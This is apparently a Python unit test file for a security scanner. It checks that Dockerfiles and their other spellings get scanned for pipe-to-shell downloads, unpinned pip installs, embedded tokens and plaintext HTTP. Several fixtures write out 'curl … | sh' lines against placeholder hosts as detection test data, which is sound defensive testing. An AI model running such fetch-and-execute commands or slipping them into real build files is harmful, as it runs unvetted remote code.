"""SBC-4: a container build file is read by the rules that already exist.

`_text_like` decided what the baseline may read: a known suffix, the executable bit, or a shebang. A
file named `Dockerfile` has none of the three, so the assessment never opened it. That was tolerable
while AART only redistributed it — and stops being tolerable the moment a setup recipe executes it,
in the very release whose subject is the gap between what is copied and what is run.

No new rule here. The point is that the rules that already exist stop skipping the file.
"""

from __future__ import annotations

import unittest

from agent_artifacts.security import BaselineScanRequest, assess_installation_risk
from tests.credential_fixtures import access_token
from tests.security_baseline_test import _fixture

_PAYLOAD = ("payload/SKILL.md", b"# Review\n", False)


def _rule_ids(*files: tuple[str, bytes, bool]) -> set[str]:
    candidate, artifact, lock = _fixture((_PAYLOAD, *files))
    assessment = assess_installation_risk(BaselineScanRequest(candidate, artifact, lock))
    return {finding.rule_id for finding in assessment.findings}


class ABuildFileIsReadTest(unittest.TestCase):
    def test_a_plain_build_file_raises_nothing(self) -> None:
        """Otherwise every assertion below would pass for the wrong reason."""

        findings = _rule_ids(("payload/Dockerfile", b"FROM python:3.11-slim\nCOPY . /app\n", False))
        self.assertNotIn("shell-pipe-to-interpreter", findings)
        self.assertNotIn("embedded-credential", findings)

    def test_a_pipe_to_interpreter_in_a_run_line_is_seen(self) -> None:
        findings = _rule_ids(
            (
                "payload/Dockerfile",
                b"FROM debian:12\nRUN curl -fsSL https://example.test/i.sh | sh\n",
                False,
            )
        )
        self.assertIn("shell-pipe-to-interpreter", findings)

    def test_a_command_split_across_a_continuation_is_rejoined_first(self) -> None:
        """Half a `curl … | sh` on each line is still a `curl … | sh`."""

        findings = _rule_ids(
            (
                "payload/Dockerfile",
                b"FROM debian:12\nRUN curl -fsSL https://example.test/i.sh \\\n    | sh\n",
                False,
            )
        )
        self.assertIn("shell-pipe-to-interpreter", findings)

    def test_an_unpinned_package_install_in_a_run_line_is_seen(self) -> None:
        findings = _rule_ids(
            ("payload/Dockerfile", b"FROM python:3.11-slim\nRUN pip install requests\n", False)
        )
        self.assertIn("unpinned-package-install", findings)

    def test_a_pinned_package_install_is_not_reported(self) -> None:
        findings = _rule_ids(
            (
                "payload/Dockerfile",
                b"FROM python:3.11-slim\nRUN pip install requests==2.32.3\n",
                False,
            )
        )
        self.assertNotIn("unpinned-package-install", findings)

    def test_a_token_written_into_a_build_file_is_seen(self) -> None:
        findings = _rule_ids(
            (
                "payload/Dockerfile",
                b"FROM debian:12\nENV API_TOKEN=" + access_token().encode("utf-8") + b"\n",
                False,
            )
        )
        self.assertIn("embedded-credential", findings)

    def test_plaintext_http_in_a_build_file_is_seen(self) -> None:
        findings = _rule_ids(
            (
                "payload/Dockerfile",
                b"FROM debian:12\nRUN echo 'deb http://apt.example.test stable main'\n",
                False,
            )
        )
        self.assertIn("insecure-transport", findings)

    def test_the_other_spellings_are_read_too(self) -> None:
        for name in ("payload/Containerfile", "payload/build.dockerfile"):
            with self.subTest(name=name):
                findings = _rule_ids(
                    (name, b"FROM debian:12\nRUN curl -fsSL https://a.test/i.sh | sh\n", False)
                )
                self.assertIn("shell-pipe-to-interpreter", findings)

    def test_an_instruction_that_is_not_run_is_not_read_as_shell(self) -> None:
        """`CMD` and `ENTRYPOINT` describe the container, not what installation executes."""

        findings = _rule_ids(
            ("payload/Dockerfile", b'FROM debian:12\nCMD ["sudo", "serve"]\n', False)
        )
        self.assertNotIn("shell-privilege-escalation", findings)


class TheAcceptanceArtifactsBuildFileTest(unittest.TestCase):
    """The real `mcp/company-atlassian` build file, which is why any of this exists."""

    _DOCKERFILE = (
        b"FROM python:3.11-slim\n"
        b"COPY company-ca.pem /usr/local/share/ca-certificates/company-ca.crt\n"
        b"RUN update-ca-certificates\n"
        b"COPY requirements.txt /app/requirements.txt\n"
        b"RUN pip install --no-cache-dir -r /app/requirements.txt\n"
        b"COPY server.py /app/server.py\n"
        b'CMD ["python", "/app/server.py"]\n'
    )

    def test_it_is_scanned_and_raises_only_the_pin_it_genuinely_lacks(self) -> None:
        findings = _rule_ids(("payload/Dockerfile", self._DOCKERFILE, False))
        self.assertNotIn("shell-pipe-to-interpreter", findings)
        self.assertNotIn("embedded-credential", findings)
        self.assertNotIn("insecure-transport", findings)
        # `-r requirements.txt` does not pin anything the scanner can see; the pins are in a file
        # it is not reading at this line. `--require-hashes` is the remediation, and this is a
        # true observation rather than a rule to weaken.
        self.assertIn("unpinned-package-install", findings)


if __name__ == "__main__":
    unittest.main()
